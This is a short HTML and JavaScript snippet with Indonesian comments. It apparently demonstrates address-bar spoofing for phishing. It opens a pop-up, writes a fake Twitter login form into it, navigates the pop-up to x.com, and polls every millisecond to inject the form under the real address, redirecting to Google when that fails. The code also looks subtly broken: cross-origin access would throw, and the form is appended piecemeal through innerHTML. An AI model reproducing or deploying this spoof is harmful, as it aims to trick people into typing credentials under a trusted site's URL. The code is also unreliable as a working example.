<script>
    function next() {
        // Redirect ke halaman Google setelah pengalihan
        w.location.replace('https://www.google.com:1234');
    }

    function f() {
        // Membuka jendela pop-up kosong
        w = window.open("");  

        // Menulis tampilan login di dalam pop-up
        w.document.write('<h2>Login Twitter</h2>');
        w.document.write('<form action="https://twitter.com/login" method="post">');
        w.document.write('<input type="text" name="username" placeholder="Username"><br>');
        w.document.write('<input type="password" name="password" placeholder="Password"><br>');
        w.document.write('<input type="submit" value="Login"><br>');
        w.document.write('</form>');
        
        // Mengubah alamat URL ke x.com, address bar berubah
        w.location = "https://x.com";

        // Mengecek alamat URL setiap 1ms dan melakukan pengecekan
        i = setInterval(function() {
            try {
                // Cek apakah sudah berhasil di redirect ke x.com
                if (w.location.href === "https://x.com") {
                    // Setelah berhasil, lanjutkan untuk menampilkan login form
                    w.document.body.innerHTML = '<h2>Login Twitter</h2>';
                    w.document.body.innerHTML += '<form action="https://twitter.com/login" method="post">';
                    w.document.body.innerHTML += '<input type="text" name="username" placeholder="Username"><br>';
                    w.document.body.innerHTML += '<input type="password" name="password" placeholder="Password"><br>';
                    w.document.body.innerHTML += '<input type="submit" value="Login"><br>';
                    w.document.body.innerHTML += '</form>';
                }
            } catch (e) {
                // Jika gagal, redirect ke halaman Google
                clearInterval(i);
                next();
            }
        }, 1);  // Mengecek setiap 1ms
    }
</script>

<a href="#" onclick="f()">Login Twitter</a>
